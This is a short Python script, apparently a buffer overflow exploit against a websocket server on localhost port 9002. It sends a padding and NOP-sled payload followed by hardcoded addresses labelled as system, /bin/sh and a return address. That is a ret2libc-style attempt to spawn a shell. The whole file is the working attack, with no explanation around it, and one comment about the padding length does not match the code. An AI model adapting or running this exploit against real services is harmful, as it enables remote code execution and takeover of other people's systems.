import asyncio
from websockets.sync.client import connect

def hello():
    with connect("ws://localhost:9002") as websocket:
        # Construct the message
        message = b"A" * (900) + b'\x90' * 5000   # 1024 'A's followed by 54 'A's +

        # Little-endian representations of the addresses
        address1 = b"\x70\x0d\x85\xf7\xff\x7f" #Address of system
        address2 = b"\xf0\x55\x84\xf7\xff\x7f" #Address of /bin/sh
        address3 = b"\x78\x86\x9d\xf7\xff\x7f" #Return address

        # Concatenate everything
        full_message = message + address1 + address2 + address3

        # Send the message
        websocket.send(full_message)

        # Receive response
        response = websocket.recv()
        print(f"Received: {response}")

hello()